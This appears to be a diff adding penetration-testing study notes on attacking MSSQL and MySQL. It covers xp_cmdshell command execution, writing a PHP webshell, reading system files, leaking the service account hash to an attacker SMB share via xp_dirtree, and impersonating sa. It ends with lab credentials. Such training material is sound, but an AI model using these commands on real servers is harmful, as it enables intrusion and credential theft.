@@ -281,3 +281,304 @@ id          username             password         data_of_joining
 ```
 
 ### Execute Commands:
+- This is one of the most desired capabilities when attacking a service, how can we gain control of the operating system...
+- MSSQL has a extended stored procedures called **xp_cmdshell**
+	- `xp_cmdshell` is a powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
+	- The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account
+	- `xp_cmdshell` operates synchronously. Control is not returned to the caller until the command-shell command is completed
+
+```cmd-session
+1> xp_cmdshell 'whoami'
+2> GO
+
+output
+-----------------------------
+no service\mssql$sqlexpress
+NULL
+(2 rows affected)
+```
+
+If xp_cmdshell is not enabled we can follow the steps below with the proper permissions: 
+
+```mssql
+-- To allow advanced options to be changed.  
+EXECUTE sp_configure 'show advanced options', 1
+GO
+
+-- To update the currently configured value for advanced options.  
+RECONFIGURE
+GO  
+
+-- To enable the feature.  
+EXECUTE sp_configure 'xp_cmdshell', 1
+GO  
+
+-- To update the currently configured value for this feature.  
+RECONFIGURE
+GO
+```
+
+We can also write to the Windows Registry using the xp_regwrite command. 
+
+MySQL also allows User Defined Functions which allows us to execute C/C++ Code as a function within SQL. 
+- https://github.com/mysqludf/lib_mysqludf_sys
+
+
+
+### MySQL - Write Local Files
+
+```shell-session
+mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+
+Query OK, 1 row affected (0.001 sec)
+```
+
+`secure_file_priv` may be set as follows:
+
+- If empty, the variable has no effect, which is not a secure setting.
+- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
+- If set to NULL, the server disables import and export operations.
+
+**Viewing the Secure File Privileges in MySQL**
+
+```shell-session
+mysql> show variables like "secure_file_priv";
+
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_file_priv |       |
++------------------+-------+
+
+1 row in set (0.005 sec)
+```
+
+**MSSQL - Enabling Ole Automation Procedures**
+- In order for us to write files within MSSQL, we need to enable the Ole Automation Procedures: 
+
+```cmd-session
+1> sp_configure 'show advanced options', 1
+2> GO
+3> RECONFIGURE
+4> GO
+5> sp_configure 'Ole Automation Procedures', 1
+6> GO
+7> RECONFIGURE
+8> GO
+```
+- We are enabling the procedure using the queries above. 
+
+**MSSQL - Create a File**
+```cmd-session
+1> DECLARE @OLE INT
+2> DECLARE @FileID INT
+3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+6> EXECUTE sp_OADestroy @FileID
+7> EXECUTE sp_OADestroy @OLE
+8> GO
+```
+
+### Reading Local Files
+- By default, MSSQL allows reading of any file within the Operating System which the account has read permissions for. 
+
+```cmd-session
+1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+2> GO
+
+BulkColumn
+
+-----------------------------------------------------------------------------
+# Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to hostnames. Each
+# entry should be kept on an individual line. The IP address should
+
+(1 rows affected)
+```
+
+**Reading Files in MySQL:**
+- By default, MySQL does not allow arbitrary read for files, however if we find ourselves having the proper settings in our favor, we can run the following command to view a files content: 
+
+```shell-session
+mysql> select LOAD_FILE("/etc/passwd");
+
++--------------------------+
+| LOAD_FILE("/etc/passwd")
++--------------------------------------------------+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+
+<SNIP>
+```
+
+
+### Capturing MSSQL Service Hash
+- When we were learning how to attack SMB, we utilized a method that when we setup a "fake SMB Server" and initiated communication, we gained more information than what we needed. This same logic can be used when attacking MSSQL and dumping hashes. 
+- We can also steal the MSSQL service account hash using the xp_subdirs or xp_dirtree undocumented stored procedures. 
+
+To make this work, we need to start Responder and impacket-smbserver, then we can start executing queries on the MSSQL: 
+
+```cmd-session
+1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
+2> GO
+
+subdirectory    depth
+--------------- -----------
+```
+- This using the xp_dirtree method
+
+```cmd-session
+1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
+2> GO
+
+HResult 0x55F6, Level 16, State 1
+xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
+```
+- This is using the xp_subdirs method, this is of course assuming that the service account has access to our SQL server. 
+
+
+This is an example of what we would get using responder: 
+```shell-session
+realCustampin@htb[/htb]$ sudo responder -I tun0
+
+                                         __               
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|              
+<SNIP>
+
+[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.10.110.17
+[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
+[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
+```
+
+
+This is using the impacket-smbserver method: 
+```shell-session
+realCustampin@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
+[*] Config file parsed                                                 
+[*] Config file parsed                                                 
+[*] Config file parsed
+[*] Incoming connection (10.129.203.7,49728)
+[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
+[*] User WINSRV02\mssqlsvc authenticated successfully                        
+[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
+[*] Closing down connection (10.129.203.7,49728)                      
+[*] Remaining connections []
+```
+
+### Impersonate Existing Users with MSSQL
+- impersonation is an SQL Server special permission that allows the current user to take on the permission of another user or login until the context is reset. 
+
+**Identifying Users that We Can Impersonate**
+```cmd-session
+1> SELECT distinct b.name
+2> FROM sys.server_permissions a
+3> INNER JOIN sys.server_principals b
+4> ON a.grantor_principal_id = b.principal_id
+5> WHERE a.permission_name = 'IMPERSONATE'
+6> GO
+
+name
+-----------------------------------------------
+sa
+ben
+valentin
+
+(3 rows affected)
+```
+
+**Verifying our Current User and Role**
+```cmd-session
+1> SELECT SYSTEM_USER
+2> SELECT IS_SRVROLEMEMBER('sysadmin')
+3> go
+
+-----------
+julio                                                                                                                    
+
+(1 rows affected)
+
+-----------
+          0
+
+(1 rows affected)
+```
+- As you can see above, we do not have the sysadmin role, however looking back on our results of users, one stands out... let's take a look at the user sa. 
+
+**Impersonating the SA User**
+```cmd-session
+1> EXECUTE AS LOGIN = 'sa'
+2> SELECT SYSTEM_USER
+3> SELECT IS_SRVROLEMEMBER('sysadmin')
+4> GO
+
+-----------
+sa
+
+(1 rows affected)
+
+-----------
+          1
+
+(1 rows affected)
+```
+
+**Note:** It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`.
+
+
+**Note:** If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.
+
+### Communicate with Other Databases with MSSQL
+- MSSQL has a configuration option called **linked servers** which enable the database engine to execute a transact-SQL statement that includes tables in another instance of SQL Server. 
+
+**Viewing Linked Servers in MSSQL**
+```cmd-session
+1> SELECT srvname, isremote FROM sysservers
+2> GO
+
+srvname                             isremote
+----------------------------------- --------
+DESKTOP-MFERMN4\SQLEXPRESS          1
+10.0.0.12\SQLEXPRESS                0
+
+(2 rows affected)
+```
+- Breaking down this command real quick, we pass the isremote query which shows which SQL servers are remote (1) or is linked (0)
+
+```cmd-session
+1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+2> GO
+
+------------------------------ ------------------------------ ------------------------------ -----------
+DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1
+
+(1 rows affected)
+```
+
+
+## Lab Questions: 
+
+Target IP: 10.129.203.12
+
+Username: htbdbuser
+Pass: MSSQLAccess01!
+
+What is the password for the "mssqlsvc" user?
+
+Enumerate the "flagDB" database and submit a flag as your answer.
